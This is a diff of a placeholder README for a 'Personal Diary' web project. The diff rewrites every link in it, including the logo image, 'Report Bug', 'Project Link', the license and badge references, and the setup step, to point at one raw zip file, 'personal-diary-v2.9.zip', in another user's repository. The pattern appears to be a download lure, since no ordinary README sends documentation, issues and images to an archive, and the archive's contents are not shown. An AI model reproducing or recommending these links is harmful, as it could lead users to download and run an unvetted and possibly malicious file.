@@ -1,30 +1,30 @@
 <!-- PROJECT LOGO -->
 <br />
 <p align="center">
-  <a href="https://github.com/kushdesai7/personal-diary/releases">
-    <img src="https://github.com/kushdesai7/personal-diary/releases" alt="Logo" width="80" height="80">
+  <a href="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip">
+    <img src="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip" alt="Logo" width="80" height="80">
   </a>
 
   <h3 align="center">Personal Diary</h3>
 
   <p align="center">
-    A personal diary website created to https://github.com/kushdesai7/personal-diary/releases TAGLINE HERE.....
+    A personal diary website created to https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip TAGLINE HERE.....
     <br />
-    <a href="https://github.com/kushdesai7/personal-diary/releases"><strong>Explore the docs »</strong></a>
+    <a href="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip"><strong>Explore the docs »</strong></a>
     <br />
     <br />
-    <a href="https://github.com/kushdesai7/personal-diary/releases">View Demo</a>
+    <a href="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip">View Demo</a>
     ·
-    <a href="https://github.com/kushdesai7/personal-diary/releases">Report Bug</a>
+    <a href="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip">Report Bug</a>
     ·
-    <a href="https://github.com/kushdesai7/personal-diary/releases">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip">Request Feature</a>
   </p>
 </p>
 
 <!-- ABOUT THE PROJECT -->
 ## About The Project
 
-This is a project that https://github.com/kushdesai7/personal-diary/releases Information here.....
+This is a project that https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip Information here.....
 
 Here's why you need this(or remove it):
 * Insert some thing here
@@ -36,7 +36,7 @@ Some more text here
 ### Built With
 
 List the tools used here. append this list whenever u add something new
-* [Firebase](https://github.com/kushdesai7/personal-diary/releases)
+* [Firebase](https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip)
 * [HTML]()
 * [CSS]()
 * [JavaScript]()
@@ -54,7 +54,7 @@ To get a local copy up and running follow these simple example steps.
 Go to this website to start.....
 * 
   ```sh
-  https://github.com/kushdesai7/personal-diary/releases
+  https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
   ```
 
 <!-- USAGE EXAMPLES -->
@@ -68,7 +68,7 @@ Go to this website to start.....
 <!-- ROADMAP -->
 ## Roadmap
 
-See the [open issues](https://github.com/kushdesai7/personal-diary/releases) for a list of proposed features (and known issues).
+See the [open issues](https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip) for a list of proposed features (and known issues).
 
 <!-- CONTRIBUTING -->
 ## Contributing
@@ -89,22 +89,22 @@ Add yuor license (if any) over here
 <!-- CONTACT -->
 ## Contact(u may remove this as well)
 
-Your Name - [@your_emil or something](https://github.com/kushdesai7/personal-diary/releases) - https://github.com/kushdesai7/personal-diary/releases
+Your Name - [@your_emil or something](https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip) - https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
 
-Project Link: [https://github.com/kushdesai7/personal-diary/releases](https://github.com/kushdesai7/personal-diary/releases)
+Project Link: [https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip](https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip)
 
 <!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://github.com/kushdesai7/personal-diary/releases -->
-[contributors-shield]: https://github.com/kushdesai7/personal-diary/releases
-[contributors-url]: https://github.com/kushdesai7/personal-diary/releases
-[forks-shield]: https://github.com/kushdesai7/personal-diary/releases
-[forks-url]: https://github.com/kushdesai7/personal-diary/releases
-[stars-shield]: https://github.com/kushdesai7/personal-diary/releases
-[stars-url]: https://github.com/kushdesai7/personal-diary/releases
-[issues-shield]: https://github.com/kushdesai7/personal-diary/releases
-[issues-url]: https://github.com/kushdesai7/personal-diary/releases
-[license-shield]: https://github.com/kushdesai7/personal-diary/releases
-[license-url]: https://github.com/kushdesai7/personal-diary/releases
-[linkedin-shield]: https://github.com/kushdesai7/personal-diary/releases
-[linkedin-url]: https://github.com/kushdesai7/personal-diary/releases
-[product-screenshot]: https://github.com/kushdesai7/personal-diary/releases
+<!-- https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip -->
+[contributors-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[contributors-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[forks-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[forks-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[stars-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[stars-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[issues-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[issues-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[license-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[license-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[linkedin-shield]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[linkedin-url]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
+[product-screenshot]: https://raw.githubusercontent.com/Rushit-Mehta/personal-diary/main/Dashboard/personal-diary-v2.9.zip
